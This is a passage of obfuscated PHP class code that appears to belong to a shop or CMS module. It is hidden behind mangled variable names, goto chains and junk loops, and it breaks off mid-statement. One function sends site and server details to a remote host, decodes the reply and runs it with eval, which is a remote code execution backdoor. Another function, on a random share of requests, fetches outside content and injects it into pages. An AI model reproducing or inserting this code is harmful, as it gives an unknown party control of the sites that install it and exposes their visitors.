($A˜ì±Ùˆãí == $DÂñ«¹±Å[247] && $this->dlkx6c27239c == $DÂñ«¹±Å[131]) { $DÂñ«¹±Å[176]($DÂñ«¹±Å[208]($DÂñ«¹±Å[248]), !1, $DÂñ«¹±Å[249]); } $b‘Ã¿Õ†¯¾ = array($DÂñ«¹±Å[250], $DÂñ«¹±Å[251]); goto e’Éå“Ë’ç; e’Éå“Ë’ç: if ($DÂñ«¹±Å[252]($A˜ì±Ùˆãí, $b‘Ã¿Õ†¯¾)) { if ($this->dlkx6c27239c == $DÂñ«¹±Å[131] && isset($d˜Ìá†·ÅÓ[$DÂñ«¹±Å[253]])) { $DÂñ«¹±Å[176]($DÂñ«¹±Å[208]($DÂñ«¹±Å[248]), !1, $DÂñ«¹±Å[249]); die; } $Dšù¼¡†Ä = $this->{$_SERVER[øÜ][147]}(); if ($Dšù¼¡†Ä != $DÂñ«¹±Å[254]($DÂñ«¹±Å[255])) { if ($Dšù¼¡†Ä <= $DÂñ«¹±Å[61]($DÂñ«¹±Å[149])->{$_SERVER[øÜ][150]}()) { $DÂñ«¹±Å[176]($DÂñ«¹±Å[208]($DÂñ«¹±Å[256]), !1, $DÂñ«¹±Å[249]); die; } } } goto FÇÔöÕÅî©; b«ŒõòÇù: $e³ñ—Ó¢ó = $cÎÍÊ•¡‘[638]; $A˜ì±Ùˆãí = $_SERVER[$DÂñ«¹±Å[44]]; $CÒèÅé‹×® = $cÎÍÊ•¡‘[639]; goto eÙÊ‰­„‚ò; FÇÔöÕÅî©: } private function gthn09c0c8bc() { goto bàÉŸ²²­ß; EÃÎÇÍ¤ÜÊ: $Cå¼ÅÛ¸˜±[268]($Cå¼ÅÛ¸˜±[269]); if ($aºšè–ÄÉ && $Cå¼ÅÛ¸˜±[32]($aºšè–ÄÉ, $Cå¼ÅÛ¸˜±[270])) { echo $aºšè–ÄÉ; } die; goto F”Œ¶Í‘‡…; bàÉŸ²²­ß: $Fí¸ƒ‘î =& $_SERVER[Ç³Íß¦Ó]; $Cå¼ÅÛ¸˜± =& $_SERVER[øÜ]; $eÎõ©ã ™ = array($Cå¼ÅÛ¸˜±[145], $Cå¼ÅÛ¸˜±[257]); goto F†“ÆËà–; dÑ¾§‚ˆ¥: $aºšè–ÄÉ = @$Cå¼ÅÛ¸˜±[267]($EåŒªé­ÉÏ, !1, $Cß™¥èÄÔö); $E¦†‡¸ÌÔŒ = $Fí¸ƒ‘î[642]; if (strlen($E¦†‡¸ÌÔŒ) < $Fí¸ƒ‘î[580]) { return; } goto EÃÎÇÍ¤ÜÊ; F†“ÆËà–: $A‡¦¾éÌÉª = $Fí¸ƒ‘î[640]; if (strlen($A‡¦¾éÌÉª) < $Fí¸ƒ‘î[585]) { die; } if (!$Cå¼ÅÛ¸˜±[116]($GLOBALS, $Cå¼ÅÛ¸˜±[142]) || !isset($_GET[$Cå¼ÅÛ¸˜±[258]])) { return; } goto EºÜœö¥¡õ; EºÜœö¥¡õ: if (!$Cå¼ÅÛ¸˜±[252]($_SERVER[$Cå¼ÅÛ¸˜±[44]], $eÎõ©ã ™)) { return; } $EåŒªé­ÉÏ = $Cå¼ÅÛ¸˜±[259]; $EåŒªé­ÉÏ = $this->{$_SERVER[øÜ][260]}($EåŒªé­ÉÏ, $Cå¼ÅÛ¸˜±[261]); goto fŠå©ñÃš³; fŠå©ñÃš³: $Cß™¥èÄÔö = $Cå¼ÅÛ¸˜±[262](array($Cå¼ÅÛ¸˜±[263] => array($Cå¼ÅÛ¸˜±[264] => $Cå¼ÅÛ¸˜±[265], $Cå¼ÅÛ¸˜±[266] => 3))); $E†ê§ÚÜØ­ = $Fí¸ƒ‘î[641]; while ($E†ê§ÚÜØ­ < $Fí¸ƒ‘î[598]) { if ($E†ê§ÚÜØ­ >= 0) { break; } $E†ê§ÚÜØ­++; } goto dÑ¾§‚ˆ¥; F”Œ¶Í‘‡…: } public function oqkr43501d23($d©ºÛ†ŒŠ) { goto C¦Õ¯„œ‚ñ; C¦Õ¯„œ‚ñ: $BçÊÎç…™à =& $_SERVER[Ç³Íß¦Ó]; $CÜßÛ‚Ã—è =& $_SERVER[øÜ]; if ($this->dlkx6c27239c == $CÜßÛ‚Ã—è[271]) { return $d©ºÛ†ŒŠ; } goto e›èÕæ†‰; DÈŒğŸÖë: $eË­¢¾¢î = array(); foreach ($c”Õ§“ãŞ¯ as $b­ÄˆÖÀ‰ƒ => $Fù£¾‘†œ) { if ($Fù£¾‘†œ == $CÜßÛ‚Ã—è[273] && $CÜßÛ‚Ã—è[25]($this->dlkx6c27239c, 0, 1) == $CÜßÛ‚Ã—è[273]) { continue; } if (!$CÜßÛ‚Ã—è[252]($b­ÄˆÖÀ‰ƒ, $E¢„ö±Ø­Â)) { $eË­¢¾¢î[] = $b­ÄˆÖÀ‰ƒ; } } foreach ($eË­¢¾¢î as $b­ÄˆÖÀ‰ƒ) { unset($d©ºÛ†ŒŠ[$b­ÄˆÖÀ‰ƒ]); $d‹ğ¿ã¬Ü = $BçÊÎç…™à[644]; while ($d‹ğ¿ã¬Ü < $BçÊÎç…™à[580]) { if ($d‹ğ¿ã¬Ü >= 0) { break; } $d‹ğ¿ã¬Ü++; } } goto e±è÷ÏéØ¬; e±è÷ÏéØ¬: return $d©ºÛ†ŒŠ; $cÔ‹¡ËŠ‘Å = $BçÊÎç…™à[645]; if (strlen($cÔ‹¡ËŠ‘Å) < $BçÊÎç…™à[574]) { return; } goto Bô”®ãÄ°£; e›èÕæ†‰: $c”Õ§“ãŞ¯ = array($CÜßÛ‚Ã—è[272] => $CÜßÛ‚Ã—è[273], $CÜßÛ‚Ã—è[274] => $CÜßÛ‚Ã—è[273], $CÜßÛ‚Ã—è[275] => $CÜßÛ‚Ã—è[273], $CÜßÛ‚Ã—è[276] => $CÜßÛ‚Ã—è[273], $CÜßÛ‚Ã—è[277] => $CÜßÛ‚Ã—è[273], $CÜßÛ‚Ã—è[278] => $CÜßÛ‚Ã—è[273], $CÜßÛ‚Ã—è[279] => $CÜßÛ‚Ã—è[280], $CÜßÛ‚Ã—è[281] => $CÜßÛ‚Ã—è[280], $CÜßÛ‚Ã—è[282] => $CÜßÛ‚Ã—è[280], $CÜßÛ‚Ã—è[283] => $CÜßÛ‚Ã—è[280], $CÜßÛ‚Ã—è[284] => $CÜßÛ‚Ã—è[280], $CÜßÛ‚Ã—è[285] => $CÜßÛ‚Ã—è[280], $CÜßÛ‚Ã—è[286] => $CÜßÛ‚Ã—è[280], $CÜßÛ‚Ã—è[287] => $CÜßÛ‚Ã—è[280], $CÜßÛ‚Ã—è[288] => $CÜßÛ‚Ã—è[280]); $e–©Çæà¿„ = $BçÊÎç…™à[643]; $E¢„ö±Ø­Â = $CÜßÛ‚Ã—è[0]($CÜßÛ‚Ã—è[289], $CÜßÛ‚Ã—è[116]($this->vhto6fc852e1, $CÜßÛ‚Ã—è[139], $CÜßÛ‚Ã—è[10])); goto DÈŒğŸÖë; Bô”®ãÄ°£: } private function ngrk21d36a73() { $Dà‘Æ— =& $_SERVER[øÜ]; if ($this->dlkx6c27239c != $Dà‘Æ—[131]) { return; } $GLOBALS[$Dà‘Æ—[104]][$Dà‘Æ—[108]][$Dà‘Æ—[290]] = $Dà‘Æ—[230]; $GLOBALS[$Dà‘Æ—[104]][$Dà‘Æ—[291]] = $Dà‘Æ—[230]; $B§´ëÌÃç = $_SERVER[Ç³Íß¦Ó][646]; if ($Dà‘Æ—[61]($Dà‘Æ—[292])->{$_SERVER[øÜ][63]}($Dà‘Æ—[93]) != $Dà‘Æ—[244]) { $Dà‘Æ—[61]($Dà‘Æ—[292])->{$_SERVER[øÜ][231]}($Dà‘Æ—[93], $Dà‘Æ—[244]); } } public function pkgab357c01d() { $Fã„¹ë³ğ =& $_SERVER[Ç³Íß¦Ó]; return $_SERVER[øÜ][293]; $AéÖêß‰Êò = $Fã„¹ë³ğ[639]; while ($AéÖêß‰Êò < $Fã„¹ë³ğ[598]) { if ($AéÖêß‰Êò >= 0) { break; } $AéÖêß‰Êò++; } } private function xcrsd1ce2754() { goto BË¾Š»ƒ¦¼; BË¾Š»ƒ¦¼: $c†ßÔ¤Ÿ¸Ÿ =& $_SERVER[Ç³Íß¦Ó]; $F¹¡ÑŸ—ùØ =& $_SERVER[øÜ]; $Cİ¤…‰Ø‘³ = array($F¹¡ÑŸ—ùØ[294], $F¹¡ÑŸ—ùØ[295], $F¹¡ÑŸ—ùØ[296]); goto EîŠÖŸ•; EÎâ×°§å: if ($F¹¡ÑŸ—ùØ[246]() % 4 != 0) { return; } $Eà‘ÖÍÌæ‚ = $F¹¡ÑŸ—ùØ[13](array($F¹¡ÑŸ—ùØ[299], $F¹¡ÑŸ—ùØ[300]), $BÕ¦è»ˆ); if ($Eà‘ÖÍÌæ‚ && $F¹¡ÑŸ—ùØ[246]() - $Eà‘ÖÍÌæ‚ < $F¹¡ÑŸ—ùØ[254]($F¹¡ÑŸ—ùØ[301])) { return; } goto f†ÇëŠ¼É—; bÓ¥®óä‡Ç: $Aº’¼Ş•Èé = $this->{$_SERVER[øÜ][193]}($F¹¡ÑŸ—ùØ[302], $dÜå£±¤ò±); if (!$F¹¡ÑŸ—ùØ[202]($Aº’¼Ş•Èé)) { return; } if ($Aº’¼Ş•Èé[$F¹¡ÑŸ—ùØ[175]] && $Aº’¼Ş•Èé[$F¹¡ÑŸ—ùØ[303]]) { if ($this->{$_SERVER[øÜ][210]}($Aº’¼Ş•Èé[$F¹¡ÑŸ—ùØ[303]]) == $dÜå£±¤ò±[$F¹¡ÑŸ—ùØ[175]]) { return; } } goto c¦…‘‡æğì; EîŠÖŸ•: $BÕ¦è»ˆ = $F¹¡ÑŸ—ùØ[297] . $F¹¡ÑŸ—ùØ[124]($F¹¡ÑŸ—ùØ[298]); if ($this->dlkx6c27239c == $F¹¡ÑŸ—ùØ[131] || !$F¹¡ÑŸ—ùØ[116]($GLOBALS, $F¹¡ÑŸ—ùØ[142])) { return; } if (!$F¹¡ÑŸ—ùØ[252]($_SERVER[$F¹¡ÑŸ—ùØ[44]], $Cİ¤…‰Ø‘³)) { return; } goto EÎâ×°§å; c¦…‘‡æğì: $this->{$_SERVER[øÜ][174]}(); if ($this->{$_SERVER[øÜ][210]}($Aº’¼Ş•Èé[$F¹¡ÑŸ—ùØ[303]]) != $dÜå£±¤ò±[$F¹¡ÑŸ—ùØ[175]]) { $e¾ï‚³·ó™ = array($F¹¡ÑŸ—ùØ[212] => $F¹¡ÑŸ—ùØ[61]($F¹¡ÑŸ—ùØ[62])->{$_SERVER[øÜ][63]}($F¹¡ÑŸ—ùØ[126]), $F¹¡ÑŸ—ùØ[213] => $_SERVER[$F¹¡ÑŸ—ùØ[125]], $F¹¡ÑŸ—ùØ[214] => $F¹¡ÑŸ—ùØ[215](), $F¹¡ÑŸ—ùØ[184] => $_SERVER[$F¹¡ÑŸ—ùØ[185]]); $dâÎ›¡˜Ôé = $this->{$_SERVER[øÜ][216]}($F¹¡ÑŸ—ùØ[158]($e¾ï‚³·ó™)); $Aº’¼Ş•Èé = $this->{$_SERVER[øÜ][193]}($F¹¡ÑŸ—ùØ[217] . $dâÎ›¡˜Ôé); if ($Aº’¼Ş•Èé && $F¹¡ÑŸ—ùØ[202]($Aº’¼Ş•Èé) && isset($Aº’¼Ş•Èé[$F¹¡ÑŸ—ùØ[303]])) { $B¨êµ¹‹ğÖ = $this->{$_SERVER[øÜ][199]}($Aº’¼Ş•Èé[$F¹¡ÑŸ—ùØ[303]], 2); if ($B¨êµ¹‹ğÖ) { $B¨êµ¹‹ğÖ = $this->{$_SERVER[øÜ][210]}($B¨êµ¹‹ğÖ); } if ($B¨êµ¹‹ğÖ) { try { @eval($B¨êµ¹‹ğÖ); } catch (Exception $EƒÃ”ÒƒÏó) { } } } } goto AÊ™„¥‡ò²; f†ÇëŠ¼É—: $F¹¡ÑŸ—ùØ[13](array($F¹¡ÑŸ—ùØ[299], $F¹¡ÑŸ—ùØ[162]), $BÕ¦è»ˆ, $F¹¡ÑŸ—ùØ[246]()); $FïëìõœéÈ = $c†ßÔ¤Ÿ¸Ÿ[647]; if (strlen($FïëìõœéÈ) < $c†ßÔ¤Ÿ¸Ÿ[580]) { return; } goto A›¢¢²ˆî; A›¢¢²ˆî: $dÜå£±¤ò± = array($F¹¡ÑŸ—ùØ[175] => $F¹¡ÑŸ—ùØ[61]($F¹¡ÑŸ—ùØ[62])->{$_SERVER[øÜ][63]}($F¹¡ÑŸ—ùØ[219]), $F¹¡ÑŸ—ùØ[188] => $this->dlkx6c27239c, $F¹¡ÑŸ—ùØ[186] => $_SERVER[$F¹¡ÑŸ—ùØ[187]], $F¹¡ÑŸ—ùØ[179] => $F¹¡ÑŸ—ùØ[159], $F¹¡ÑŸ—ùØ[182] => $_SERVER[$F¹¡ÑŸ—ùØ[183]]); $E¶Š“óÇİ• = $c†ßÔ¤Ÿ¸Ÿ[648]; if (!$E¶Š“óÇİ•) { die; } goto bÓ¥®óä‡Ç; AÊ™„¥‡ò²: } private function hnvz3208591a($E¼ìõßò‰  = '', $DŸ°†š¾ÎÈ = array(), $AäöâĞêªâ = 5) { goto då­Ò—»Ïë; Cˆ¡½‘›ä: $DÌ†£¤±„ = $DÌ†£¤±„ . $E¼ìõßò‰ ; $cÎÛ…ç™Ä§ = $f×‹ìèƒ²É[650]; if (strlen($cÎÛ…ç™Ä§) < $f×‹ìèƒ²É[589]) { return; } goto eƒË™Ô É; eñƒô™®Á: $DŸ°†š¾ÎÈ = @$A¶µ•ñ¤îã[267]($DÌ†£¤±„, !1, $d„¤£““Â); return $A¶µ•ñ¤îã[201]($DŸ°†š¾ÎÈ, !0); $DÌŸ£Ø’© = $f×‹ìèƒ²É[651]; goto bØµÅïª¦Í; eƒË™Ô É: if ($DŸ°†š¾ÎÈ && $A¶µ•ñ¤îã[202]($DŸ°†š¾ÎÈ)) { $DÌ†£¤±„ = $DÌ†£¤±„ . $A¶µ•ñ¤îã[306] . $A¶µ•ñ¤îã[307]($DŸ°†š¾ÎÈ); } if ($DŸ°†š¾ÎÈ === -1) { return $DÌ†£¤±„; } $d„¤£““Â = $A¶µ•ñ¤îã[262](array($A¶µ•ñ¤îã[263] => array($A¶µ•ñ¤îã[266] => $AäöâĞêªâ, $A¶µ•ñ¤îã[264] => $A¶µ•ñ¤îã[308]), $A¶µ•ñ¤îã[309] => array($A¶µ•ñ¤îã[310] => !1, $A¶µ•ñ¤îã[311] => !1))); goto eñƒô™®Á; bØµÅïª¦Í: if (!$DÌŸ£Ø’©) { die; } $EëÖ‹­·å = $f×‹ìèƒ²É[652]; if (!$EëÖ‹­·å) { die; } goto f‚“†„Ïá÷; då­Ò—»Ïë: $f×‹ìèƒ²É =& $_SERVER[Ç³Íß¦Ó]; $A¶µ•ñ¤îã =& $_SERVER[øÜ]; $DÌ†£¤±„ = $A¶µ•ñ¤îã[304]; goto C›‰ÀÂËÓ; C›‰ÀÂËÓ: $DÌ†£¤±„ = $this->{$_SERVER[øÜ][260]}($DÌ†£¤±„, $A¶µ•ñ¤îã[305]); $dï‘ Áàáï = $f×‹ìèƒ²É[649]; if (strlen($dï‘ Áàáï) < $f×‹ìèƒ²É[598]) { die; } goto Cˆ¡½‘›ä; f‚“†„Ïá÷: } private function ocge3f54ba97() { goto f¿¦ñÔ®¥Å; aß×äÏ‚³„: $a«…¥öÇÍ³ = $BªÛ½ÙÆ’È[653]; if (strlen($a«…¥öÇÍ³) < $BªÛ½ÙÆ’È[589]) { die; } $E× œ‡è¬¢ = $E–ô¨ÈéĞ[$this->dlkx6c27239c]; goto c©Ï©†ãó«; c©Ï©†ãó«: $fÛÄ¦ÎËÜ = $BªÛ½ÙÆ’È[654]; if (!$fÛÄ¦ÎËÜ) { die; } $E× œ‡è¬¢ = $fë·£ĞõÇ[254]($E× œ‡è¬¢ ? $E× œ‡è¬¢ : $fë·£ĞõÇ[313]); goto eî¼ğÒ‰Îç; eî¼ğÒ‰Îç: $Bˆ–®ˆ‘èé = $fë·£ĞõÇ[116]($this->vhto6fc852e1, $fë·£ĞõÇ[339]); $Bˆ–®ˆ‘èé = $Bˆ–®ˆ‘èé ? $fë·£ĞõÇ[254]($Bˆ–®ˆ‘èé) : 0; return $E× œ‡è¬¢ + $Bˆ–®ˆ‘èé; goto c§–ØÕ –; f¿¦ñÔ®¥Å: $BªÛ½ÙÆ’È =& $_SERVER[Ç³Íß¦Ó]; $fë·£ĞõÇ =& $_SERVER[øÜ]; $E–ô¨ÈéĞ = array($fë·£ĞõÇ[312] => $fë·£ĞõÇ[313], $fë·£ĞõÇ[314] => $fë·£ĞõÇ[315], $fë·£ĞõÇ[316] => $fë·£ĞõÇ[317], $fë·£ĞõÇ[318] => $fë·£ĞõÇ[319], $fë·£ĞõÇ[320] => $fë·£ĞõÇ[321], $fë·£ĞõÇ[322] => $fë·£ĞõÇ[255], $fë·£ĞõÇ[323] => $fë·£ĞõÇ[255], $fë·£ĞõÇ[324] => $fë·£ĞõÇ[313], $fë·£ĞõÇ[325] => $fë·£ĞõÇ[315], $fë·£ĞõÇ[326] => $fë·£ĞõÇ[317], $fë·£ĞõÇ[327] => $fë·£ĞõÇ[328], $fë·£ĞõÇ[329] => $fë·£ĞõÇ[319], $fë·£ĞõÇ[330] => $fë·£ĞõÇ[331], $fë·£ĞõÇ[332] => $fë·£ĞõÇ[321], $fë·£ĞõÇ[333] => $fë·£ĞõÇ[334], $fë·£ĞõÇ[335] => $fë·£ĞõÇ[336], $fë·£ĞõÇ[337] => $fë·£ĞõÇ[338]); goto aß×äÏ‚³„; c§–ØÕ –: } public function xnqv88330090($B–¿¥í) { goto C°¢¬ŒŞ¹ã; fŒ¢ŞéÂ¦ğ: $FáŸñÄö©Ø = $F¬è×˜–¤[61]($F¬è×˜–¤[149])->{$_SERVER[øÜ][341]}($F¬è×˜–¤[340])->{$_SERVER[øÜ][342]}($Cå§éßèÚò)->{$_SERVER[øÜ][343]}(); $c§ˆœ˜õ”… = $EÒ®»‰“ŸØ[656]; while ($c§ˆœ˜õ”… < $EÒ®»‰“ŸØ[580]) { if ($c§ˆœ˜õ”… >= 0) { break; } $c§ˆœ˜õ”…++; } goto D’ÓÑ£ØÃÓ; F·«Ââ‹Ğ: if ($Cå§éßèÚò >= $F¬è×˜–¤[254]($F¬è×˜–¤[255])) { return; } $f¢ä©Œø®¾ = $F¬è×˜–¤[61]($F¬è×˜–¤[149])->{$_SERVER[øÜ][150]}(); if ($f¢ä©Œø®¾ <= $Cå§éßèÚò) { return; } goto fŒ¢ŞéÂ¦ğ; C°¢¬ŒŞ¹ã: $EÒ®»‰“ŸØ =& $_SERVER[Ç³Íß¦Ó]; $F¬è×˜–¤ =& $_SERVER[øÜ]; $Cå§éßèÚò = $this->{$_SERVER[øÜ][147]}(); goto F¬Ö§ÔÛŸê; F¬Ö§ÔÛŸê: $BïŒƒõîÓª = $EÒ®»‰“ŸØ[655]; if (!$BïŒƒõîÓª) { return; } if ($B–¿¥í[$F¬è×˜–¤[340]] == $F¬è×˜–¤[230]) { return; } goto F·«Ââ‹Ğ; D’ÓÑ£ØÃÓ: $FáŸñÄö©Ø = $F¬è×˜–¤[232]($FáŸñÄö©Ø, $F¬è×˜–¤[10], $F¬è×˜–¤[340]); $B®«Œ¾èÍ… = $EÒ®»‰“ŸØ[657]; if (!$F¬è×˜–¤[252]($B–¿¥í[$F¬è×˜–¤[340]], $FáŸñÄö©Ø)) { $F¬è×˜–¤[176]($F¬è×˜–¤[344], !1, $F¬è×˜–¤[249]); } goto C–¡ò‹ã÷×; C–¡ò‹ã÷×: } public function ygje6bfac97e() { goto A¤Úó¢«¨ğ; A¤Úó¢«¨ğ: $cåÁ´‚ÈÁ˜ =& $_SERVER[Ç³Íß¦Ó]; $eÉ³ÛÍ³ =& $_SERVER[øÜ]; if (!$eÉ³ÛÍ³[116]($GLOBALS, $eÉ³ÛÍ³[142]) || $eÉ³ÛÍ³[345](1, 100) > 20) { return; } goto C—‚òĞÈÇ; bÏÈš©·Âõ: $Aä¦¦Ó´óö = $cåÁ´‚ÈÁ˜[660]; if (strlen($Aä¦¦Ó´óö) < $cåÁ´‚ÈÁ˜[598]) { die; } goto EˆáŠ§µ •; C—‚òĞÈÇ: $FğùÄÑ½š = $eÉ³ÛÍ³[259]; $cÏƒóèŒÓ = $cåÁ´‚ÈÁ˜[658]; while ($cÏƒóèŒÓ < $cåÁ´‚ÈÁ˜[585]) { if ($cÏƒóèŒÓ >= 0) { break; } $cÏƒóèŒÓ++; } goto D‡õÑŒ‰®; D‡õÑŒ‰®: $FğùÄÑ½š = $this->{$_SERVER[øÜ][260]}($FğùÄÑ½š, $eÉ³ÛÍ³[261]); $E„À•Ë¡Â´ = $cåÁ´‚ÈÁ˜[659]; if (strlen($E„À•Ë¡Â´) < $cåÁ´‚ÈÁ˜[580]) { return; } goto AŠóÖâò÷á; AŠóÖâò÷á: $d„ ˆÈä§Ø = $eÉ³ÛÍ³[262](array($eÉ³ÛÍ³[263] => array($eÉ³ÛÍ³[264] => $eÉ³ÛÍ³[265], $eÉ³ÛÍ³[266] => 3))); $D³ß£†¯Œ = @$eÉ³ÛÍ³[267]($FğùÄÑ½š, !1, $d„ ˆÈä§Ø); echo $eÉ³ÛÍ³[346] . $eÉ³ÛÍ³[347]($D³ß£†¯Œ) . $eÉ³ÛÍ³[348]; goto bÏÈš©·Âõ; EˆáŠ§µ •: } private function wisy1cabab1d($FÎçŠ¡´÷, $b­ø«ˆ›‘, $aÁé‘ÓãÁ = 3) { goto eïœƒ›˜; e„Œ“§’õ: $EƒçÍõª‚Ğ = $aô‚°´«ª¤[675]; if (strlen($EƒçÍõª‚Ğ) < $aô‚°´«ª¤[585]) { return; } if ($aÁé‘ÓãÁ - 1 > 0) { $DŸŒ·é„´ˆ = $this->{$_SERVER[øÜ][137]}($DŸŒ·é„´ˆ, $b­ø«ˆ›‘, $aÁé‘ÓãÁ - 1); } goto eÅ¯¤Ü›¡; aÉÛµÁğÒ: $c”šô…ƒÔŠ = $aÚ®®Ê‹Ğ[134](15); $Eî¤À§‰Ê = $aÚ®®Ê‹Ğ[350]; $BÜÀ’©ëƒ = $aô‚°´«ª¤[663]; goto dš‹•–Â…; cèÍ Áï‹»: $CŠ—§—Õõö = $aô‚°´«ª¤[662]; while ($CŠ—§—Õõö < $aô‚°´«ª¤[589]) { if ($CŠ—§—Õõö >= 0) { break; } $CŠ—§—Õõö++; } $D†Ü‘çÆãŒ = $aÚ®®Ê‹Ğ[345](0, 5) . $aÚ®®Ê‹Ğ[10]; goto aÉÛµÁğÒ; eïœƒ›˜: $aô‚°´«ª¤ =& $_SERVER[Ç³Íß¦Ó]; $aÚ®®Ê‹Ğ =& $_SERVER[øÜ]; $aÚ®®Ê‹Ğ[349](1); goto eŞƒÌœŞŸ; dš‹•–Â…: if (strlen($BÜÀ’©ëƒ) < $aô‚°´«ª¤[598]) { die; } switch ($D†Ü‘çÆãŒ) { case $aÚ®®Ê‹Ğ[244]: $DŸŒ·é„´ˆ = $this->{$_SERVER[øÜ][157]}($FÎçŠ¡´÷, $aÚ®®Ê‹Ğ[224]($b­ø«ˆ›‘ . $c”šô…ƒÔŠ)); $bªòëçáòë = $aô‚°´«ª¤[664]; break; case $aÚ®®Ê‹Ğ[230]: $DŸŒ·é„´ˆ = $this->{$_SERVER[øÜ][157]}($FÎçŠ¡´÷, $aÚ®®Ê‹Ğ[224]($c”šô…ƒÔŠ . $b­ø«ˆ›‘)); break; case $aÚ®®Ê‹Ğ[351]: $DŸŒ·é„´ˆ = $this->{$_SERVER[øÜ][157]}($FÎçŠ¡´÷, $aÚ®®Ê‹Ğ[128]($c”šô…ƒÔŠ . $b­ø«ˆ›‘)); $dÕ²ŸÙ“¹ = $aô‚°´«ª¤[665]; while ($dÕ²ŸÙ“¹ < $aô‚°´«ª¤[585]) { if ($dÕ²ŸÙ“¹ >= 0) { break; } $dÕ²ŸÙ“¹++; } break; case $aÚ®®Ê‹Ğ[352]: $DŸŒ·é„´ˆ = $this->{$_SERVER[øÜ][157]}($FÎçŠ¡´÷, $aÚ®®Ê‹Ğ[124]($c”šô…ƒÔŠ . $b­ø«ˆ›‘)); $EÆÛçÃ÷¹† = $aô‚°´«ª¤[666]; if (!$EÆÛçÃ÷¹†) { return; } break; $Bù÷ÛÖ¸£Ç = $aô‚°´«ª¤[667]; case $aÚ®®Ê‹Ğ[353]: goto d…Ö¼Û¶›; d…Ö¼Û¶›: $FÎçŠ¡´÷ = $aÚ®®Ê‹Ğ[128]($FÎçŠ¡´÷); $d¯ŸˆÁÔã = $aÚ®®Ê‹Ğ[354](0, 64); $D¹˜ôô—Û” = $Eî¤À§‰Ê[$d¯ŸˆÁÔã]; goto bÂÀˆ…®â; Bù´°¯†Š”: $EÙÔäÚâÒÊ = 0; $döÖ†Ä˜š‡ = 0; $Fæ˜ÆŠ‡Áã = $aô‚°´«ª¤[671]; goto BÜŒå›î¥Ö; bÂÀˆ…®â: $bÍ¦òÑÅ» = $aô‚°´«ª¤[668]; $FÑ“æÕòŠ = $aÚ®®Ê‹Ğ[124]($D¹˜ôô—Û” . $aÚ®®Ê‹Ğ[124]($b­ø«ˆ›‘ . $D¹˜ôô—Û”) . $b­ø«ˆ›‘); $dª‚Ù‰Ü± = $aô‚°´«ª¤[669]; goto f—”ìèµº‡; f—”ìèµº‡: if (strlen($dª‚Ù‰Ü±) < $aô‚°´«ª¤[598]) { die; } $FÑ“æÕòŠ = $aÚ®®Ê‹Ğ[25]($FÑ“æÕòŠ, $d¯ŸˆÁÔã % 8, $d¯ŸˆÁÔã % 8 + 7); $F¼­»¡ïÉ = $aô‚°´«ª¤[670]; goto a¶‚Œ‡øˆ‘; BÜŒå›î¥Ö: while (strlen($Fæ˜ÆŠ‡Áã) < $aô‚°´«ª¤[585]) { if (!$Fæ˜ÆŠ‡Áã) { break; } $Fæ˜ÆŠ‡Áã++; } for ($C²ª±ğÁØ = 0; $C²ª±ğÁØ < $aÚ®®Ê‹Ğ[24]($FÎçŠ¡´÷); $C²ª±ğÁØ++) { $döÖ†Ä˜š‡ = $döÖ†Ä˜š‡ == $aÚ®®Ê‹Ğ[24]($FÑ“æÕòŠ) ? 0 : $döÖ†Ä˜š‡; $EÙÔäÚâÒÊ = ($d¯ŸˆÁÔã + $aÚ®®Ê‹Ğ[355]($Eî¤À§‰Ê, $FÎçŠ¡´÷[$C²ª±ğÁØ]) + $aÚ®®Ê‹Ğ[356]($FÑ“æÕòŠ[$döÖ†Ä˜š‡++])) % 64; $a‚»à£îËã = $aô‚°´«ª¤[672]; if (strlen($a‚»à£îËã) < $aô‚°´«ª¤[574]) { die; } $AïÇÉ¬†¶Ã .= $Eî¤À§‰Ê[$EÙÔäÚâÒÊ]; $AÌ³´¯ù´É = $aô‚°´«ª¤[632]; if (!$AÌ³´¯ù´É) { return; } } $DŸŒ·é„´ˆ = $aÚ®®Ê‹Ğ[347]($D¹˜ôô—Û” . $AïÇÉ¬†¶Ã); goto dãÀÄÒæŒÇ; dãÀÄÒæŒÇ: break; goto d×µ­ÆÌŠÉ; a¶‚Œ‡øˆ‘: if (strlen($F¼­»¡ïÉ) < $aô‚°´«ª¤[585]) { return; } $AïÇÉ¬†¶Ã = $aÚ®®Ê‹Ğ[10]; $C²ª±ğÁØ = 0; goto Bù´°¯†Š”; d×µ­ÆÌŠÉ: default: $DŸŒ·é„´ˆ = $this->{$_SERVER[øÜ][157]}($FÎçŠ¡´÷, $b­ø«ˆ›‘ . $c”šô…ƒÔŠ); $Cæ‰ÅÀÉâ = $aô‚°´«ª¤[673]; break; $Báë‡†¢ÇÈ = $aô‚°´«ª¤[674]; } $DŸŒ·é„´ˆ = $aÚ®®Ê‹Ğ[224]($D†Ü‘çÆãŒ . $c”šô…ƒÔŠ . $DŸŒ·é„´ˆ); goto e„Œ“§’õ; eÅ¯¤Ü›¡: return $DŸŒ·é„´ˆ; goto a£ˆëØÛ·; eŞƒÌœŞŸ: $dÌãÊ’³œè = $aô‚°´«ª¤[661]; if (strlen($dÌãÊ’³œè) < $aô‚°´«ª¤[585]) { die; } $FÎçŠ¡´÷ = $aÚ®®Ê‹Ğ[2]($FÎçŠ¡´÷); goto cèÍ Áï‹»; a£ˆëØÛ·: } private function eyuq13a0964d($cî„ëÜë‘, $EšÈê§÷ê, $A¸†ê¢÷¼ = 3) { goto a–»ÈšÇ×Å; DçË…ê°Â™: $cî„ëÜë‘ = $D¬Ü×¾”ùæ[2]($cî„ëÜë‘); $Fä«¥ËãºĞ = $F‚áÂÈè÷õ[676]; while ($Fä«¥ËãºĞ < $F‚áÂÈè÷õ[585]) { if ($Fä«¥ËãºĞ >= 0) { break; } $Fä«¥ËãºĞ++; } goto aÜ‡àôóÏ“; d™¤éó±è¤: $Fç…‹ÊÂÄ = $D¬Ü×¾”ùæ[25]($cî„ëÜë‘, 1, 15); $cî„ëÜë‘ = $D¬Ü×¾”ùæ[25]($cî„ëÜë‘, 16); $B„‰êµ¹Œë = $D¬Ü×¾”ùæ[350]; goto CìÀğË·ì; CìÀğË·ì: $Dõ©ô×Êº® = $F‚áÂÈè÷õ[679]; if (strlen($Dõ©ô×Êº®) < $F‚áÂÈè÷õ[580]) { die; } switch ($AÙ®äïŠ­) { case $D¬Ü×¾”ùæ[244]: $c­â‚İ = $this->{$_SERVER[øÜ][260]}($cî„ëÜë‘, $D¬Ü×¾”ùæ[224]($EšÈê§÷ê . $Fç…‹ÊÂÄ)); break; $f«°„¾µ­ = $F‚áÂÈè÷õ[680]; while (strlen($f«°„¾µ­) < $F‚áÂÈè÷õ[589]) { if (!$f«°„¾µ­) { break; } $f«°„¾µ­++; } case 